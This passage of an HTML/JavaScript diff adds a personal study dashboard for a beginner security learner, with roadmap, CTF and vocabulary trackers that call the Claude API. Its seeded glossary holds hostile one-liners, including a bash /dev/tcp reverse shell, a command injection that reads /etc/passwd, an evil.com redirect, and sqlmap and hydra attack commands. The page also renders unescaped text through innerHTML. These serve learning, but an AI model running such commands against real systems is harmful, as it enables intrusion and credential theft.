+    const raw = data.content.map(c=>c.text||'').join('').replace(/```json|```/g,'').trim();
+    const parsed = JSON.parse(raw);
+    if (!store.roadmaps) store.roadmaps = [];
+    store.roadmaps.unshift({ id: Date.now(), title: parsed.title, phases: parsed.phases, progress:{}, created: new Date().toLocaleDateString(), aiGenerated: true });
+    save(); closeModal('aiRoadmapModal'); renderRoadmapList();
+    toast('> ROADMAP GENERATED ✓');
+  } catch(e) {
+    status.textContent = '> ERROR: Could not generate. Try again.';
+  }
+  btn.disabled=false; btn.textContent='GENERATE ROADMAP';
+}
+
+async function parsePastedRoadmap() {
+  const text = document.getElementById('pasteRmText').value.trim();
+  const title = document.getElementById('pasteRmTitle').value.trim() || 'My Roadmap';
+  if (!text) { toast('> paste something first','#ff4d6d'); return; }
+  const btn = document.getElementById('parseRmBtn');
+  const status = document.getElementById('parseRmStatus');
+  btn.disabled=true; btn.textContent='ANALYZING...';
+  status.textContent='> AI is parsing your roadmap...';
+  try {
+    const res = await fetch('https://api.anthropic.com/v1/messages', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({
+        model:'claude-sonnet-4-20250514',
+        max_tokens:1000,
+        system:`You convert pasted roadmap text into structured JSON. Output raw JSON only — no markdown, no preamble.
+
+Return this exact structure:
+{"title":"Title","phases":[{"label":"Phase label","title":"Phase title","tasks":["task 1","task 2"]}]}
+
+Rules:
+- Extract the natural phases/stages/months/weeks from the text
+- Each task should be 1 clean sentence
+- Keep tasks concise (under 12 words)
+- If title is in the text use it, otherwise make one up
+- Group related items under meaningful phases`,
+        messages:[{role:'user',content:`Parse this roadmap and convert to JSON. Use "${title}" as the title if not found in text.\n\n${text}`}]
+      })
+    });
+    const data = await res.json();
+    const raw = data.content.map(c=>c.text||'').join('').replace(/```json|```/g,'').trim();
+    const parsed = JSON.parse(raw);
+    if (!store.roadmaps) store.roadmaps = [];
+    store.roadmaps.unshift({ id: Date.now(), title: parsed.title||title, phases: parsed.phases, progress:{}, created: new Date().toLocaleDateString(), parsed: true });
+    save(); closeModal('pasteRoadmapModal'); renderRoadmapList();
+    toast('> ROADMAP PARSED & SAVED ✓');
+  } catch(e) {
+    status.textContent = '> ERROR: Could not parse. Try again or use manual builder.';
+  }
+  btn.disabled=false; btn.textContent='🤖 ANALYZE & CONVERT';
+}
+
+function renderRoadmapList() {
+  const grid = document.getElementById('rmGrid');
+  if (!store.roadmaps) store.roadmaps = [];
+  if (!store.roadmaps.length) {
+    grid.innerHTML = `<div class="empty-state">
+      <div class="empty-icon">🗺</div>
+      <div>NO ROADMAPS YET</div>
+      <div style="margin-top:8px;font-size:11px;color:#3d5a6a;">Generate with AI, paste from anywhere, or build manually</div>
+    </div>`; return;
+  }
+  grid.innerHTML = store.roadmaps.map(rm => {
+    const total = rm.phases.reduce((a,p)=>a+(p.tasks||[]).length,0);
+    const done = Object.values(rm.progress||{}).filter(Boolean).length;
+    const pct = total ? Math.round((done/total)*100) : 0;
+    const badge = rm.aiGenerated ? '<span class="tag tag-blue" style="font-size:9px;">AI</span>' : rm.parsed ? '<span class="tag tag-gold" style="font-size:9px;">PARSED</span>' : '<span class="tag tag-green" style="font-size:9px;">MANUAL</span>';
+    return `<div class="card" style="cursor:pointer;transition:all 0.2s;margin-bottom:14px;" onmouseenter="this.style.borderColor='var(--accent2)'" onmouseleave="this.style.borderColor='var(--border)'" onclick="openRoadmap(${rm.id})">
+      <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:10px;">
+        <div>
+          <div class="font-orb" style="font-size:15px;color:var(--text);margin-bottom:4px;">${rm.title}</div>
+          <div style="display:flex;gap:6px;align-items:center;">${badge}<span class="font-mono text-muted" style="font-size:10px;">${rm.phases.length} PHASES &nbsp;·&nbsp; ${total} TASKS &nbsp;·&nbsp; ${rm.created}</span></div>
+        </div>
+        <div style="text-align:right;">
+          <div class="font-orb" style="font-size:22px;color:${pct===100?'var(--accent)':'var(--accent4)'};">${pct}%</div>
+          <div class="font-mono text-muted" style="font-size:10px;">${done}/${total} DONE</div>
+        </div>
+      </div>
+      <div class="habit-progress-bar"><div class="habit-progress-fill" style="width:${pct}%;background:linear-gradient(90deg,var(--accent),var(--accent2))"></div></div>
+      <div style="display:flex;gap:6px;margin-top:10px;flex-wrap:wrap;">
+        ${rm.phases.slice(0,4).map(p=>`<span class="resource-chip">${p.label||p.title}</span>`).join('')}
+        ${rm.phases.length>4?`<span class="resource-chip">+${rm.phases.length-4} more</span>`:''}
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function openRoadmap(id) {
+  activeRmId = id;
+  const rm = store.roadmaps.find(r=>r.id===id);
+  document.getElementById('rmListView').style.display = 'none';
+  document.getElementById('rmDetailView').style.display = 'block';
+  document.getElementById('rmDetailTitle').textContent = rm.title;
+  document.getElementById('rmDeleteBtn').onclick = () => deleteRoadmap(id);
+  renderRoadmapDetail(rm);
+}
+function backToRoadmapList() {
+  document.getElementById('rmListView').style.display = '';
+  document.getElementById('rmDetailView').style.display = 'none';
+  activeRmId = null;
+}
+function deleteRoadmap(id) {
+  store.roadmaps = store.roadmaps.filter(r=>r.id!==id);
+  save(); backToRoadmapList(); renderRoadmapList(); toast('> ROADMAP DELETED','#ff4d6d');
+}
+function renderRoadmapDetail(rm) {
+  const total = rm.phases.reduce((a,p)=>a+(p.tasks||[]).length,0);
+  const done = Object.values(rm.progress||{}).filter(Boolean).length;
+  const pct = total ? Math.round((done/total)*100) : 0;
+  document.getElementById('rmDetailProgress').innerHTML = `
+    <div class="card" style="display:flex;align-items:center;gap:20px;padding:14px 20px;">
+      <div class="font-orb" style="font-size:32px;color:${pct===100?'var(--accent)':'var(--accent4)'};">${pct}%</div>
+      <div style="flex:1">
+        <div class="habit-progress-bar" style="height:8px;"><div class="habit-progress-fill" style="width:${pct}%;"></div></div>
+        <div class="font-mono text-muted mt-8" style="font-size:11px;">${done} OF ${total} TASKS COMPLETED</div>
+      </div>
+      ${pct===100?'<div style="font-size:24px;">🎉</div>':''}
+    </div>`;
+  const phaseColors = ['var(--accent)','var(--accent2)','var(--accent4)','#a855f7','var(--accent3)','#06b6d4','#f97316','#84cc16'];
+  document.getElementById('rmDetailContent').innerHTML = rm.phases.map((p,pi) => {
+    const col = phaseColors[pi % phaseColors.length];
+    return `<div class="roadmap-phase" style="--phase-col:${col}">
+      <div class="phase-header">
+        ${p.label?`<span class="phase-time" style="border-color:${col}33;background:${col}11;color:${col};">${p.label}</span>`:''}
+        <span class="phase-title">${p.title}</span>
+      </div>
+      <ul class="phase-tasks">
+        ${(p.tasks||[]).map((t,ti)=>{
+          const key = `${rm.id}_${pi}_${ti}`;
+          const isDone = !!(rm.progress||{})[key];
+          return `<li class="phase-task ${isDone?'done':''}" onclick="toggleCustomTask(${rm.id},'${key}',this)">
+            <div class="task-check" style="${isDone?`background:${col}22;border-color:${col};color:${col}`:''}"> ${isDone?'✓':''}</div>
+            <span>${t}</span>
+          </li>`;
+        }).join('')}
+      </ul>
+      <div style="position:absolute;left:-24px;top:8px;width:10px;height:10px;border-radius:50%;background:${col};border:2px solid var(--bg);box-shadow:0 0 8px ${col};"></div>
+    </div>`;
+  }).join('');
+}
+function toggleCustomTask(rmId, key, el) {
+  const rm = store.roadmaps.find(r=>r.id===rmId);
+  if (!rm.progress) rm.progress = {};
+  rm.progress[key] = !rm.progress[key];
+  save();
+  const isDone = rm.progress[key];
+  el.classList.toggle('done', isDone);
+  el.querySelector('.task-check').textContent = isDone?'✓':'';
+  // refresh progress bar
+  renderRoadmapDetail(rm);
+}
+
+// =================== CTF TRACKER ===================
+function addCTF() {
+  const name = document.getElementById('ctfName').value.trim();
+  if (!name) { toast('> name required','#ff4d6d'); return; }
+  store.ctf.unshift({ id:Date.now(), name, platform:document.getElementById('ctfPlatform').value, diff:document.getElementById('ctfDiff').value, points:parseInt(document.getElementById('ctfPoints').value)||0, cat:document.getElementById('ctfCategory').value, notes:document.getElementById('ctfNotes').value.trim(), date:new Date().toLocaleDateString() });
+  document.getElementById('ctfName').value=''; document.getElementById('ctfPoints').value=''; document.getElementById('ctfNotes').value='';
+  save(); renderCTF(); toast('> CTF LOGGED 🏴');
+}
+function deleteCTF(id) { store.ctf=store.ctf.filter(c=>c.id!==id); save(); renderCTF(); }
+function renderCTF() {
+  const totalPoints = store.ctf.reduce((a,c)=>a+c.points,0);
+  const easy = store.ctf.filter(c=>c.diff==='easy').length;
+  const hard = store.ctf.filter(c=>c.diff==='hard').length;
+  document.getElementById('ctfStats').innerHTML = `
+    <div class="ctf-stat"><div class="ctf-stat-num" style="color:var(--accent)">${store.ctf.length}</div><div class="ctf-stat-label">SOLVED</div></div>
+    <div class="ctf-stat"><div class="ctf-stat-num" style="color:var(--accent4)">${totalPoints}</div><div class="ctf-stat-label">TOTAL POINTS</div></div>
+    <div class="ctf-stat"><div class="ctf-stat-num" style="color:var(--accent3)">${hard}</div><div class="ctf-stat-label">HARD</div></div>
+    <div class="ctf-stat"><div class="ctf-stat-num" style="color:var(--accent2)">${[...new Set(store.ctf.map(c=>c.platform))].length}</div><div class="ctf-stat-label">PLATFORMS</div></div>
+  `;
+  const list = document.getElementById('ctfList');
+  if (!store.ctf.length) { list.innerHTML='<div class="empty-state"><div class="empty-icon">🏴</div>NO CTFs LOGGED YET — START HACKING</div>'; return; }
+  const catColors = {Web:'tag-red',Network:'tag-blue',Crypto:'tag-gold',Forensics:'tag-green',Pwn:'tag-red',OSINT:'tag-blue',Misc:'tag-blue'};
+  list.innerHTML = store.ctf.map(c=>`<div class="ctf-item">
+    <div>
+      <div class="ctf-item-name">${c.name}</div>
+      <div class="text-muted font-mono" style="font-size:10px;margin-top:2px;">${c.date} &nbsp;|&nbsp; ${c.platform}</div>
+      ${c.notes?`<div style="font-size:12px;color:var(--text2);margin-top:4px;">${c.notes}</div>`:''}
+    </div>
+    <div class="ctf-item-meta">
+      <span class="tag ${catColors[c.cat]||'tag-blue'}">${c.cat}</span>
+      <span class="ctf-difficulty diff-${c.diff}">${c.diff.toUpperCase()}</span>
+      <span class="ctf-points">${c.points}pts</span>
+      <button class="icon-btn" onclick="deleteCTF(${c.id})">🗑</button>
+    </div>
+  </div>`).join('');
+}
+
+// =================== VOCAB ===================
+let lastAIAnswer = null;
+let lastAITerm = '';
+
+async function askAI() {
+  const q = document.getElementById('aiVocabInput').value.trim();
+  if (!q) { toast('> type something first','#ff4d6d'); return; }
+  const btn = document.getElementById('aiAskBtn');
+  const resultBox = document.getElementById('aiVocabResult');
+  const textEl = document.getElementById('aiVocabText');
+  btn.textContent = 'THINKING...'; btn.disabled = true;
+  resultBox.style.display = 'block';
+  textEl.textContent = '> querying claude...';
+  document.getElementById('aiSaveBtn').style.display = 'none';
+  try {
+    const res = await fetch('https://api.anthropic.com/v1/messages', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({
+        model:'claude-sonnet-4-20250514',
+        max_tokens:1000,
+        system:`You are a cybersecurity tutor for a beginner BTech student in India learning web application security and ethical hacking. Explain concepts clearly, simply, and practically. Use examples. Keep answers under 200 words. Format: start with a 1-line definition, then explain with an example, then add a practical tip for a beginner hacker. Use plain text, no markdown.`,
+        messages:[{role:'user',content:q}]
+      })
+    });
+    const data = await res.json();
+    const answer = data.content.map(c=>c.text||'').join('');
+    textEl.textContent = answer;
+    lastAIAnswer = answer;
+    lastAITerm = q;
+    document.getElementById('aiSaveBtn').style.display = 'inline-block';
+  } catch(e) {
+    textEl.textContent = '> ERROR: Could not reach Claude API. Check your connection.';
+  }
+  btn.textContent = 'ASK CLAUDE'; btn.disabled = false;
+}
+
+function saveAIAnswer() {
+  if (!lastAIAnswer) return;
+  if (!store.vocab) store.vocab = [];
+  store.vocab.unshift({ id:Date.now(), term: lastAITerm, def: lastAIAnswer, cat:'general', aiGenerated:true });
+  save(); renderVocab(); toast('> SAVED TO VOCAB ✓');
+  document.getElementById('aiSaveBtn').style.display = 'none';
+}
+
+function getDefaultVocab() {
+  return [
+    // WEB HACKING
+    {id:1,term:'SQL Injection',def:'Attacker inserts malicious SQL code into input fields to manipulate the database. Can dump data, bypass auth, or delete records. Types: classic, blind, time-based.',cat:'web'},
+    {id:2,term:'XSS (Cross-Site Scripting)',def:'Injecting malicious JavaScript into web pages. Reflected (in URL), Stored (in DB), DOM-based. Can steal cookies, hijack sessions, redirect users.',cat:'web'},
+    {id:3,term:'IDOR',def:'Insecure Direct Object Reference — accessing resources by changing IDs (e.g. /user/123 → /user/124) without authorization check. Very common in bug bounty.',cat:'web'},
+    {id:4,term:'CSRF',def:'Cross-Site Request Forgery — tricks authenticated user into executing unwanted actions by forging requests from another site. Fixed by CSRF tokens.',cat:'web'},
+    {id:5,term:'SSRF',def:'Server-Side Request Forgery — forces server to make HTTP requests to internal resources, exposing internal services like AWS metadata (169.254.169.254).',cat:'web'},
+    {id:6,term:'XXE Injection',def:'XML External Entity — abusing XML parsers to read local files, SSRF, or RCE. Inject external entity in XML input. Common in SOAP APIs.',cat:'web'},
+    {id:7,term:'File Upload Vulnerability',def:'Uploading malicious files (PHP webshells, .exe) by bypassing extension checks. Try double extensions (.php.jpg), null bytes, magic bytes.',cat:'web'},
+    {id:8,term:'Directory Traversal',def:'Using ../ sequences to navigate outside the web root and read sensitive files like /etc/passwd. Also called path traversal.',cat:'web'},
+    {id:9,term:'Command Injection',def:'Injecting OS commands through vulnerable input fields. e.g. ping 8.8.8.8; cat /etc/passwd. Semicolons, pipes, backticks used as separators.',cat:'web'},
+    {id:10,term:'Open Redirect',def:'Redirecting users to external malicious sites via vulnerable redirect parameters. Used in phishing. e.g. /redirect?url=evil.com',cat:'web'},
+    {id:11,term:'HTTP Request Smuggling',def:'Manipulating how front-end and back-end servers interpret HTTP request boundaries. Can bypass security controls and access internal data.',cat:'web'},
+    {id:12,term:'OWASP Top 10',def:'The 10 most critical web security risks. Covers injection, broken auth, XSS, IDOR, misconfigs, and more. Must-know for web hacking.',cat:'web'},
+    {id:13,term:'JWT Attack',def:'JSON Web Token vulnerabilities: alg:none attack, weak secret brute force, kid injection. Use jwt.io to decode and analyze tokens.',cat:'web'},
+    {id:14,term:'SSTI',def:'Server-Side Template Injection — injecting template syntax ({{7*7}}) to achieve RCE. Common in Jinja2 (Python), Twig (PHP), Freemarker (Java).',cat:'web'},
+    {id:15,term:'CORS Misconfiguration',def:'Cross-Origin Resource Sharing misconfiguration allows attacker-controlled origins to make credentialed requests, stealing sensitive data.',cat:'web'},
+    // NETWORKING
+    {id:16,term:'TCP/IP',def:'Foundational network protocol suite. TCP = reliable, connection-oriented (3-way handshake: SYN, SYN-ACK, ACK). IP = addressing + routing.',cat:'networking'},
+    {id:17,term:'DNS',def:'Domain Name System — translates domain names to IP addresses. Port 53. Attacks: DNS spoofing, zone transfer (axfr), subdomain enumeration.',cat:'networking'},
+    {id:18,term:'ARP',def:'Address Resolution Protocol — maps IP to MAC on local network. ARP spoofing/poisoning enables MITM attacks by sending fake ARP replies.',cat:'networking'},
+    {id:19,term:'OSI Model',def:'7 layers: Physical, Data Link, Network, Transport, Session, Presentation, Application. Remember: Please Do Not Throw Sausage Pizza Away.',cat:'networking'},
+    {id:20,term:'Subnetting',def:'Dividing a network into smaller subnetworks using subnet masks (e.g. /24 = 255.255.255.0 = 256 hosts). Essential for network recon.',cat:'networking'},
+    {id:21,term:'VPN',def:'Virtual Private Network — encrypts traffic and tunnels it through a server. Used by attackers to hide origin IP during recon and attacks.',cat:'networking'},
+    {id:22,term:'Firewall',def:'Network security device that monitors and filters traffic based on rules. Stateful (tracks connections) vs stateless (checks packets only).',cat:'networking'},
+    {id:23,term:'Port Numbers',def:'Key ports: 21 FTP, 22 SSH, 23 Telnet, 25 SMTP, 53 DNS, 80 HTTP, 443 HTTPS, 445 SMB, 3306 MySQL, 3389 RDP, 8080 HTTP-alt.',cat:'networking'},
+    {id:24,term:'MITM Attack',def:'Man-in-the-Middle — attacker intercepts communication between two parties. Methods: ARP spoofing, DNS poisoning, SSL stripping.',cat:'networking'},
+    {id:25,term:'Wireshark',def:'Network packet analyzer. Capture live traffic or analyze .pcap files. Filter: http, tcp.port==80, ip.addr==x.x.x.x. Key for CTF forensics.',cat:'networking'},
+    // LINUX
+    {id:26,term:'chmod',def:'Change file permissions. chmod 777 (rwx all), chmod 644 (owner rw, others r), chmod +x (add execute). Critical for understanding SUID privesc.',cat:'linux'},
+    {id:27,term:'SUID Bit',def:'Set User ID — file runs with owner privileges. Find SUID files: find / -perm -4000 2>/dev/null. Classic Linux privilege escalation vector.',cat:'linux'},
+    {id:28,term:'sudo -l',def:'List commands current user can run as root. If misconfigured (ALL, NOPASSWD), can be abused for privilege escalation. Always check this first.',cat:'linux'},
+    {id:29,term:'cron jobs',def:'Scheduled tasks in Linux. Check /etc/crontab and /var/spool/cron. Writable cron scripts owned by root = easy privilege escalation.',cat:'linux'},
+    {id:30,term:'grep',def:'Search text patterns. grep -r "password" /etc/ (recursive), grep -i (case insensitive), grep -v (invert). Essential for finding credentials.',cat:'linux'},
+    {id:31,term:'/etc/passwd',def:'Stores user account info. Format: username:x:UID:GID:info:home:shell. x means password in /etc/shadow. Readable by all users.',cat:'linux'},
+    {id:32,term:'/etc/shadow',def:'Stores hashed passwords. Only root-readable. If you can read this, extract and crack with hashcat or john the ripper.',cat:'linux'},
+    {id:33,term:'netstat / ss',def:'Show network connections and listening ports. ss -tulnp shows all TCP/UDP ports with process names. Essential for post-exploitation.',cat:'linux'},
+    {id:34,term:'Bash Scripting',def:'Automate tasks with shell scripts. Shebang: #!/bin/bash. Variables: $var. Loop: for i in $(seq 1 10); do ... done. Essential skill.',cat:'linux'},
+    {id:35,term:'File Descriptors',def:'0=stdin, 1=stdout, 2=stderr. Redirect: > (overwrite), >> (append), 2>&1 (redirect errors to stdout). Useful in reverse shells.',cat:'linux'},
+    // TOOLS
+    {id:36,term:'Burp Suite',def:'Industry standard web proxy. Intercept/modify HTTP requests, scan for vulns, brute force with Intruder, repeat requests in Repeater, decode in Decoder.',cat:'tools'},
+    {id:37,term:'Nmap',def:'Network scanner. Key flags: -sV (service version), -sC (default scripts), -A (OS+version+scripts), -p- (all 65535 ports), -O (OS detection).',cat:'tools'},
+    {id:38,term:'Metasploit',def:'Exploitation framework. msfconsole → search [vuln] → use [module] → show options → set RHOSTS/LHOST → run. Use msfvenom for payloads.',cat:'tools'},
+    {id:39,term:'Gobuster / ffuf',def:'Directory/file brute-forcers. gobuster dir -u URL -w wordlist. ffuf -u URL/FUZZ -w wordlist. Essential for web recon to find hidden paths.',cat:'tools'},
+    {id:40,term:'sqlmap',def:'Automated SQL injection tool. sqlmap -u "URL?id=1" --dbs (list databases) --tables -D dbname --dump. Use --level and --risk for more coverage.',cat:'tools'},
+    {id:41,term:'Hydra',def:'Network login brute-forcer. hydra -l user -P passlist ssh://IP for SSH. hydra -l admin -P list http-post-form for web logins.',cat:'tools'},
+    {id:42,term:'John the Ripper',def:'Password cracker. john hash.txt --wordlist=rockyou.txt. Identify hash type first with hash-identifier or hashid.',cat:'tools'},
+    {id:43,term:'Hashcat',def:'GPU-based password cracker. hashcat -m 0 hash.txt rockyou.txt (MD5). Faster than John for large lists. Use -m to specify hash type.',cat:'tools'},
+    {id:44,term:'Netcat (nc)',def:'Swiss army knife for networking. nc -lvnp 4444 (listener). nc IP PORT (connect). Used for reverse shells, file transfer, port scanning.',cat:'tools'},
+    {id:45,term:'Enum4linux',def:'Linux tool for enumerating Windows/Samba shares, users, groups, policies. enum4linux -a IP dumps everything. Key for CTF networks.',cat:'tools'},
+    {id:46,term:'WPScan',def:'WordPress vulnerability scanner. wpscan --url URL --enumerate u (users) p (plugins) t (themes). Essential for any WordPress target.',cat:'tools'},
+    {id:47,term:'Subfinder / Amass',def:'Subdomain enumeration tools. subfinder -d domain.com. amass enum -d domain.com. Find forgotten subdomains for bug bounty.',cat:'tools'},
+    // GENERAL
+    {id:48,term:'Privilege Escalation',def:'Gaining higher permissions than intended. Linux: SUID, sudo misconfig, writable cron, PATH hijack. Windows: unquoted paths, DLL hijacking, token impersonation.',cat:'general'},
+    {id:49,term:'Reverse Shell',def:'Target connects back to attacker. Common payloads: bash -i >& /dev/tcp/IP/PORT 0>&1. Always set up nc listener first: nc -lvnp PORT.',cat:'general'},
+    {id:50,term:'Bind Shell',def:'Attacker connects to target. Target opens port and listens. Use when inbound connections to attacker are blocked but target port is reachable.',cat:'general'},
+    {id:51,term:'Reconnaissance',def:'First phase of pentesting. Passive: OSINT, Google dorking, Shodan, WHOIS. Active: Nmap, Gobuster, subdomain enum. Never skip recon.',cat:'general'},
+    {id:52,term:'CVE',def:'Common Vulnerabilities and Exposures — unique ID for known security vulnerabilities. CVE-YEAR-NUMBER. Check NVD or exploit-db for details and exploits.',cat:'general'},
+    {id:53,term:'Payload',def:'Code delivered to target to execute an action (reverse shell, add user, etc.). Can be staged (downloads more code) or stageless (self-contained).',cat:'general'},
+    {id:54,term:'Enumeration',def:'Systematic process of extracting info from a target: users, shares, services, versions. More enum = more attack surface found.',cat:'general'},
+    {id:55,term:'Hash Cracking',def:'Recovering plaintext from hashed values. Methods: dictionary attack (rockyou.txt), brute force, rainbow tables. Tools: hashcat, john.',cat:'general'},
+    {id:56,term:'Google Dorking',def:'Using advanced Google search operators to find sensitive info. e.g. site:target.com filetype:pdf, intitle:"index of", inurl:admin.',cat:'general'},
+    {id:57,term:'Social Engineering',def:'Manipulating people to reveal info or perform actions. Phishing (email), vishing (voice), pretexting (fake scenario). Humans = weakest link.',cat:'general'},
+    {id:58,term:'Bug Bounty',def:'Programs by companies paying researchers to find vulnerabilities. Platforms: HackerOne, Bugcrowd, Intigriti. Start with easy targets and P3/P4 bugs.',cat:'general'},
+  ];
+}
+function saveVocab() {
+  const term = document.getElementById('vocabTerm').value.trim();
+  const def = document.getElementById('vocabDef').value.trim();
+  if (!term||!def) { toast('> both fields required','#ff4d6d'); return; }
+  if (!store.vocab) store.vocab=[];
+  store.vocab.unshift({ id:Date.now(), term, def, cat:document.getElementById('vocabCat').value });
+  save(); closeModal('vocabModal'); renderVocab(); toast('> TERM SAVED');
+}
+function renderVocab() {
+  const q = (document.getElementById('vocabSearch').value||'').toLowerCase();
+  const cat = document.getElementById('vocabCatFilter').value;
+  let items = store.vocab||[];
+  if (cat!=='all') items=items.filter(v=>v.cat===cat);
+  if (q) items=items.filter(v=>v.term.toLowerCase().includes(q)||v.def.toLowerCase().includes(q));
+  const catColors = {web:'tag-red',networking:'tag-blue',linux:'tag-green',tools:'tag-gold',general:'tag-blue'};
+  const grid = document.getElementById('vocabGrid');
+  if (!items.length) { grid.innerHTML='<div class="empty-state" style="grid-column:1/-1"><div class="empty-icon">📖</div>NO TERMS FOUND</div>'; return; }
+  grid.innerHTML = items.map(v=>`<div class="vocab-card">
+    <div class="vocab-term">${v.term}${v.aiGenerated?'<span class="tag tag-blue" style="margin-left:8px;font-size:9px;">AI</span>':''}</div>
+    <div class="vocab-def">${v.def}</div>
+    <div class="vocab-cat" style="display:flex;justify-content:space-between;align-items:center;">
+      <span class="tag ${catColors[v.cat]||'tag-blue'}">${v.cat.toUpperCase()}</span>
+      <button class="icon-btn" style="font-size:11px;" onclick="deleteVocab(${v.id})">🗑</button>
+    </div>
+  </div>`).join('');
+}
+function deleteVocab(id) {
+  store.vocab = store.vocab.filter(v=>v.id!==id);
+  save(); renderVocab(); toast('> TERM REMOVED','#ff4d6d');
+}
+
+// =================== INIT ===================
+load();
+renderNotes();
+renderHabits();
+renderCTF();
+renderVocab();
+renderPomoLog();
+if (!store.roadmaps) store.roadmaps = [];
+renderRoadmapList();
+
+// Default seed habits for new users
+if (store.habits.length === 0) {
+  store.habits = [
+    { id:1, name:'Daily TryHackMe / PortSwigger', cat:'cyber', streak:0, best:0, history:[], lastDone:null },
+    { id:2, name:'Typing Practice (keybr/monkeytype)', cat:'practice', streak:0, best:0, history:[], lastDone:null },
+    { id:3, name:'Read / Watch English Content', cat:'study', streak:0, best:0, history:[], lastDone:null },
+    { id:4, name:'Write Blog Post / Writeup', cat:'cyber', streak:0, best:0, history:[], lastDone:null },
+  ];
+  save(); renderHabits();
+}
+</script>
+</body>
+</html>
